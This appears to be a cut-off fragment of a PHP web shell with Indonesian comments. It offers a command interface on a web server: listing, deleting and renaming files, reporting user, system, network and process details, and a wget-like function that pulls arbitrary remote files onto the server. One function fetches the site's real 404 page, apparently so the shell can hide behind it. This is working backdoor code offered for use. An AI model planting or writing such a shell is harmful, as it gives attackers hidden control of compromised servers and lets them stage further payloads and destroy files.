// 1. 📂 List file
function listFilesDetailed($path = '.') {
    $output = "";
    $dir = __DIR__ . ($path == '.' ? '' : '/' . ltrim($path, './'));
    
    if (!is_dir($dir)) {
        return "Directory not found: " . $dir;
    }
    
    $files = scandir($dir);
    $output .= sprintf("%-5s %-30s %-12s %-20s\n", "No", "Filename", "Size", "Modified");
    $output .= str_repeat("-", 75) . "\n";
    
    $no = 1;
    foreach ($files as $file) {
        if ($file == '.' || $file == '..') continue;
        
        $filepath = $dir . '/' . $file;
        $size = is_file($filepath) ? number_format(filesize($filepath)) . " B" : "<DIR>";
        $mtime = is_file($filepath) ? date("Y-m-d H:i:s", filemtime($filepath)) : "-";
        
        $output .= sprintf("%-5s %-30s %-12s %-20s\n", $no++, $file, $size, $mtime);
    }
    
    return $output;
}

// 2. 🗑️ Delete file
function deleteFilePHP($filename) {
    $filepath = __DIR__ . '/' . basename($filename);
    
    if (!file_exists($filepath)) {
        return "Error: File not found - " . $filename;
    }
    
    if (!is_file($filepath)) {
        return "Error: Not a file - " . $filename;
    }
    
    if (unlink($filepath)) {
        return "Success: File deleted - " . $filename;
    } else {
        return "Error: Cannot delete - " . $filename;
    }
}

// 3. 📝 Rename/Move file
function renameFilePHP($oldname, $newname) {
    $oldpath = __DIR__ . '/' . basename($oldname);
    $newpath = __DIR__ . '/' . basename($newname);
    
    if (!file_exists($oldpath)) {
        return "Error: File not found - " . $oldname;
    }
    
    if (file_exists($newpath)) {
        return "Error: Target already exists - " . $newname;
    }
    
    if (rename($oldpath, $newpath)) {
        return "Success: Renamed/Moved - " . $oldname . " → " . $newname;
    } else {
        return "Error: Cannot rename - " . $oldname;
    }
}

// 10. ⬇️ wget alternative (download file dengan nama custom)
function downloadFilePHP($url, $custom_name = '') {
    if (!filter_var($url, FILTER_VALIDATE_URL)) {
        return "Error: Invalid URL - " . $url;
    }
    
    // Tentukan nama file
    if (!empty($custom_name)) {
        $filename = $custom_name;
    } else {
        $filename = basename(parse_url($url, PHP_URL_PATH));
        if (empty($filename)) {
            $filename = 'downloaded_' . time() . '.file';
        }
    }
    
    // Sanitize filename
    $filename = preg_replace('/[^a-zA-Z0-9._-]/', '_', $filename);
    $filepath = __DIR__ . '/' . $filename;
    
    // Download content
    $content = @file_get_contents($url);
    
    if ($content === false && function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
        $content = curl_exec($ch);
        curl_close($ch);
    }
    
    if ($content === false || empty($content)) {
        return "Error: Failed to download from " . $url;
    }
    
    if (file_put_contents($filepath, $content)) {
        $size = number_format(filesize($filepath));
        return "Success: Downloaded - " . $filename . " (" . $size . " bytes) from " . $url;
    } else {
        return "Error: Cannot save file - " . $filename;
    }
}

// Fungsi untuk mengambil halaman 404 asli dari domain
function getOriginal404Page() {
    $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
    $host = $_SERVER['HTTP_HOST'];
    
    $random_path = '/404-' . md5(rand() . time() . uniqid()) . '.html';
    $url = $protocol . '://' . $host . $random_path;
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT'] ?? 'Mozilla/5.0');
    
    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    if ($http_code == 404 && !empty($response)) {
        return $response;
    }
    
    return false;
}

    echo "<b>Command:</b> " . htmlspecialchars($cmd_input) . "\n\n";
    echo "<b>Result:</b>\n";
    echo str_repeat("=", 70) . "\n";
    
    // Parse command untuk rm (delete file)
    if (preg_match('/^rm\s+(.+)$/i', $cmd_input, $matches)) {
        $result = deleteFilePHP(trim($matches[1]));
    }
    // Parse command untuk mv / rename (ganti nama)
    elseif (preg_match('/^mv\s+([^\s]+)\s+([^\s]+)$/i', $cmd_input, $matches)) {
        $oldname = trim($matches[1]);
        $newname = trim($matches[2]);
        $result = renameFilePHP($oldname, $newname);
    }
    // Parse command untuk rename (sama seperti mv)
    elseif (preg_match('/^rename\s+([^\s]+)\s+([^\s]+)$/i', $cmd_input, $matches)) {
        $oldname = trim($matches[1]);
        $newname = trim($matches[2]);
        $result = renameFilePHP($oldname, $newname);
    }
    // Parse command untuk wget (download file) - support nama custom
    elseif (preg_match('/^wget\s+(https?:\/\/[^\s]+)(?:\s+([^\s]+))?$/i', $cmd_input, $matches)) {
        $url = trim($matches[1]);
        $custom_name = isset($matches[2]) ? trim($matches[2]) : '';
        $result = downloadFilePHP($url, $custom_name);
    }
    // Built-in commands
    else {
        $cmd = strtolower($cmd_input);
        switch($cmd) {
            case 'ls':
            case 'ls -la':
            case 'list':
            case 'dir':
                $result = listFilesDetailed('.');
                break;
            case 'pwd':
            case 'cwd':
                $result = getCurrentDir();
                break;
            case 'whoami':
            case 'user':
                $result = getWhoAmI();
                break;
            case 'id':
                $result = getID();
                break;
            case 'uname':
            case 'uname -a':
            case 'sysinfo':
                $result = getSystemInfoAlt();
                break;
            case 'ifconfig':
            case 'ip':
            case 'network':
                $result = getNetworkInfo();
                break;
            case 'ps':
            case 'ps aux':
            case 'process':
                $result = getProcessList();
                break;
            default:
                $result = "Command tidak dikenal: " . htmlspecialchars($cmd_input) . "\n\n";
                $result .= "Commands yang tersedia:\n";
                $result .= "  📂 ls / ls -la        - List file & directory\n";
                $result .= "  📁 pwd                - Current directory\n";
                $result .= "  👤 whoami             - User information\n";
                $result .= "  🆔 id                 - User & Group IDs\n";
                $result .= "  💻 uname -a           - System information\n";
                $result .= "  🌐 ifconfig           - Network information\n";
                $result .= "  ⚙️ ps aux             - Process list\n";
                $result .= "  🗑️ rm namafile        - Delete file\n";
                $result .= "  📝 mv file1 file2     - Rename/Move file\n";
                $result .= "  📝 rename file1 file2 - Rename/Move file\n";
                $result .= "  ⬇️ wget URL           - Download file (auto name)\n";
                $result .= "  ⬇️ wget URL namabaru  - Download file with custom name\n";
                break;
        }
    }
    
    echo htmlspecialchars($result);
    echo "\n" . str_repeat("=", 70);
    echo "</pre>";
    echo "</div>";
}
